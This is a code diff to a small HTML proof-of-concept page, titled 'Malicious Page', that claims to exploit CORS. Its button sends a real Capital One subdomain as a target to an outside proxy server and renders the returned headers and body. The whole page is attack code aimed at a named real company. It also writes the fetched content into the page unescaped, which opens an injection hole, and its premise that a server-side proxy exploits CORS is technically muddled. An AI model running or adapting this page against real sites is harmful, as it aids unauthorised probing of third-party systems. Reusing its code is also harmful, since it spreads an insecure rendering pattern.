@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
 <head>
   <title>Malicious Page</title>
@@ -6,20 +7,35 @@
   <h1>Click this button to exploit CORS!</h1>
   <button id="exploitButton">Exploit</button>
 
+  <div id="response"></div> <!-- Placeholder for displaying the response -->
+
   <script>
     document.getElementById('exploitButton').addEventListener('click', function() {
-      fetch('https://testingphase-74fh.onrender.com', {
+      fetch('https://testingphase-74fh.onrender.com/proxy', {
         method: 'POST',
         body: JSON.stringify({
-          targetUrl: 'https://coaf-prequalification.capitalone.com/'
+          targetUrl: 'https://coaf-prequalification.capitalone.com/'  // Target URL
         }),
         headers: {
           'Content-Type': 'application/json'
         }
       })
-      .then(response => response.text())
+      .then(response => response.json())
       .then(data => {
-        console.log('Data from Capital One:', data);
+        // Display headers and body on the webpage
+        const responseDiv = document.getElementById('response');
+        
+        // Display Headers
+        const headersHTML = `<h2>Response Headers:</h2><pre>${JSON.stringify(data.headers, null, 2)}</pre>`;
+        
+        // Display Body
+        const bodyHTML = `<h2>Response Body:</h2><pre>${data.body}</pre>`;
+        
+        // Append the headers and body to the page
+        responseDiv.innerHTML = headersHTML + bodyHTML;
+      })
+      .catch(error => {
+        console.error('Error fetching data:', error);
       });
     });
   </script>
